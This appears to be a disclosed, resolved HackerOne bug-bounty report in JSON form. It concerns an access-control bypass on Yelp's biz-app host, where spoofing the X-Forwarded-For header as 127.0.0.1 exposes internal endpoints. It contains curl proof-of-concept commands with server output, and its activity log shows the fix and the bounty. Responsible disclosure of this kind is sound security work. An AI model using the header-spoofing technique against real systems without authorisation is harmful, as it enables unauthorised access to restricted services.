{"id":1011767,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDExNzY3","url":"https://hackerone.com/reports/1011767","title":"X-Forward-For Header allows to bypass access restrictions","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-10-19T12:30:08.920Z","submitted_at":"2020-10-19T12:30:08.985Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"parzel","url":"/parzel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":545,"url":"https://hackerone.com/yelp","handle":"yelp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Yelp","twitter_handle":"","website":"https://www.yelp.com","about":"Connecting people to great local businesses in communities around the world."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-26T18:22:01.346Z","bug_reporter_agreed_on_going_public_at":"2020-10-25T14:45:32.529Z","team_member_agreed_on_going_public_at":"2020-10-26T18:22:01.220Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nIf the \"X-Forward-For: 127.0.0.1\" header is used, it allows to bypass restrictions of the web application and access endpoints that are restricted otherwise. This allows for example to access the \"Business Owner App backend API\". The responding server thinks, he is accessed by an internal IP.\n\n## Platform(s) Affected:\nWebsite: https://biz-app.yelp.com\n\n## Steps To Reproduce:\nPOC1:\n```\n➜  /tmp curl -k https://biz-app.yelp.com/status                                \n\n{\"error\": {\"id\": \"PredicateMismatch\"}}%                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/status -H \"X-Forwarded-For: 127.0.0.1\"\n\n{\"host\": \"biz--app-main--useast1-74dd77b89b-fgtdk\", \"health\": {}, \"mem_vsz\": 1111.61328125, \"mem_rss\": 410.0, \"pid\": 91941, \"uptime\": 178784.86051034927, \"version\": null}\n```\n\nPOC2:\n```\n➜  /tmp curl -k https://biz-app.yelp.com/swagger.json                                                                                                                                                                \n{\"error\": {\"id\": \"HTTPNotFound\"}}%                                                                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/swagger.json -H \"X-Forwarded-For: 127.0.0.1\"                                                                                                                                                                                                                                                                                                                            \n█████\n█████\n███████\n█████████\n████\n███\n████\n██████\n█████████ \n██████████ [...]\n```\n\nThe responding server thinks, it is accessed by an internal IP as can be seen in the headers:\n```\nHTTP/1.1 200 OK\nConnection: close\nserver: openresty/1.13.6.2\ncontent-type: application/json\nx-b3-sampled: 0\nx-is-internal-ip-address: true\nx-zipkin-id: 2fce61c10ade1e32\nx-routing-service: routing-main--useast1-d84b86b87-cwstn; site=biz_app\nx-mode: ro\nx-proxied: 10-65-64-83-useast1aprod\nx-extlb: 10-65-64-83-useast1aprod\nAccept-Ranges: bytes\nDate: Mon, 19 Oct 2020 12:21:19 GMT\nVia: 1.1 varnish\nX-Served-By: cache-hhn4033-HHN\nX-Cache: MISS\nX-Cache-Hits: 0\nContent-Length: 573093\n```\n\n## Impact\n\nAs the attacker is seen as having an internal IP he is able to access resources which should otherwise be restricted for him.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eIf the \u0026quot;X-Forward-For: 127.0.0.1\u0026quot; header is used, it allows to bypass restrictions of the web application and access endpoints that are restricted otherwise. This allows for example to access the \u0026quot;Business Owner App backend API\u0026quot;. The responding server thinks, he is accessed by an internal IP.\u003c/p\u003e\n\n\u003ch2 id=\"platform-s-affected\"\u003ePlatform(s) Affected:\u003c/h2\u003e\n\n\u003cp\u003eWebsite: \u003ca title=\"https://biz-app.yelp.com\" href=\"/redirect?url=https%3A%2F%2Fbiz-app.yelp.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://biz-app.yelp.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003ePOC1:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜  /tmp curl -k https://biz-app.yelp.com/status                                \n\n{\u0026quot;error\u0026quot;: {\u0026quot;id\u0026quot;: \u0026quot;PredicateMismatch\u0026quot;}}%                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/status -H \u0026quot;X-Forwarded-For: 127.0.0.1\u0026quot;\n\n{\u0026quot;host\u0026quot;: \u0026quot;biz--app-main--useast1-74dd77b89b-fgtdk\u0026quot;, \u0026quot;health\u0026quot;: {}, \u0026quot;mem_vsz\u0026quot;: 1111.61328125, \u0026quot;mem_rss\u0026quot;: 410.0, \u0026quot;pid\u0026quot;: 91941, \u0026quot;uptime\u0026quot;: 178784.86051034927, \u0026quot;version\u0026quot;: null}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePOC2:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜  /tmp curl -k https://biz-app.yelp.com/swagger.json                                                                                                                                                                \n{\u0026quot;error\u0026quot;: {\u0026quot;id\u0026quot;: \u0026quot;HTTPNotFound\u0026quot;}}%                                                                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/swagger.json -H \u0026quot;X-Forwarded-For: 127.0.0.1\u0026quot;                                                                                                                                                                                                                                                                                                                            \n█████\n█████\n███████\n█████████\n████\n███\n████\n██████\n█████████ \n██████████ [...]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe responding server thinks, it is accessed by an internal IP as can be seen in the headers:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nConnection: close\nserver: openresty/1.13.6.2\ncontent-type: application/json\nx-b3-sampled: 0\nx-is-internal-ip-address: true\nx-zipkin-id: 2fce61c10ade1e32\nx-routing-service: routing-main--useast1-d84b86b87-cwstn; site=biz_app\nx-mode: ro\nx-proxied: 10-65-64-83-useast1aprod\nx-extlb: 10-65-64-83-useast1aprod\nAccept-Ranges: bytes\nDate: Mon, 19 Oct 2020 12:21:19 GMT\nVia: 1.1 varnish\nX-Served-By: cache-hhn4033-HHN\nX-Cache: MISS\nX-Cache-Hits: 0\nContent-Length: 573093\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAs the attacker is seen as having an internal IP he is able to access resources which should otherwise be restricted for him.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-24T14:45:32.602Z","allow_singular_disclosure_after":-2985968.1391715,"singular_disclosure_allowed":true,"vote_count":61,"voters":["m0chan","rahsec","powerpuff","dmc3","ms-13","hell1337","vellangelus00","demonia","3x3s","sodium_","and 51 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":44096,"asset_type":"URL","asset_identifier":"biz-app.yelp.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9563522,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n","markdown_message":"\u003cp\u003eHi there!\u003c/p\u003e\n\n\u003cp\u003eThanks for submitting your report to us! Please expect a response within a week.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-10-19T12:30:09.866Z","updated_at":"2020-10-19T12:30:09.866Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Yelp"}},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9566538,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi there!\n\nThanks for submitting your report to us!\n\nWe are investigating the reported issue and will update this thread once we have further details.\n\nBest,\nThe Yelp Security Team","markdown_message":"\u003cp\u003eHi there!\u003c/p\u003e\n\n\u003cp\u003eThanks for submitting your report to us!\u003c/p\u003e\n\n\u003cp\u003eWe are investigating the reported issue and will update this thread once we have further details.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-19T17:42:29.640Z","updated_at":"2020-10-19T17:42:29.640Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9583334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @parzel,\n\nWe've updated these endpoints so that the `X-Forwarded-For` header should not be able to affect whether we serve the real content or serve an error for this service. Can you verify that our fix works?\n\nBest,\nThe Yelp Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/parzel\"\u003e@parzel\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve updated these endpoints so that the \u003ccode\u003eX-Forwarded-For\u003c/code\u003e header should not be able to affect whether we serve the real content or serve an error for this service. Can you verify that our fix works?\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-21T00:33:41.701Z","updated_at":"2020-10-21T00:33:41.701Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9585029,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vzhou,\n\nI verified the fix and I think it is working properly.\n\nCheers,\n@parzel ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vzhou\"\u003e@vzhou\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI verified the fix and I think it is working properly.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n\u003ca href=\"/parzel\"\u003e@parzel\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-21T07:16:54.573Z","updated_at":"2020-10-21T07:16:54.573Z","actor":{"username":"parzel","cleared":false,"url":"/parzel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595539,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @parzel,\n\nThanks for verifying the fix! I will now close this issue as resolved, and award you a bounty amount of $200.\n\nWe appreciate your diligent effort in this matter, and encourage you to keep banging away on the Yelps. Thanks for helping keep our users safe!\n\nBest,\nThe Yelp Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/parzel\"\u003e@parzel\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for verifying the fix! I will now close this issue as resolved, and award you a bounty amount of $200.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your diligent effort in this matter, and encourage you to keep banging away on the Yelps. Thanks for helping keep our users safe!\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-21T18:32:40.948Z","updated_at":"2020-10-21T18:32:40.948Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Yelp"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"yelp","collaborator":{"username":"parzel","url":"/parzel"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595543,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-10-21T18:33:09.376Z","updated_at":"2020-10-21T18:33:09.376Z","additional_data":{"old_severity":"High","new_severity":"Medium (6.1)","old_severity_id":880642,"new_severity_id":884799},"actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595544,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-21T18:33:13.279Z","updated_at":"2020-10-21T18:33:13.279Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"parzel","url":"/parzel"},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9628721,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this?","markdown_message":"\u003cp\u003eCan we disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-25T14:45:32.561Z","updated_at":"2020-10-25T14:45:32.561Z","first_to_agree":true,"actor":{"username":"parzel","cleared":false,"url":"/parzel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9639510,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-26T18:22:01.251Z","updated_at":"2020-10-26T18:22:01.251Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9639511,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-26T18:22:01.386Z","updated_at":"2020-10-26T18:22:01.386Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}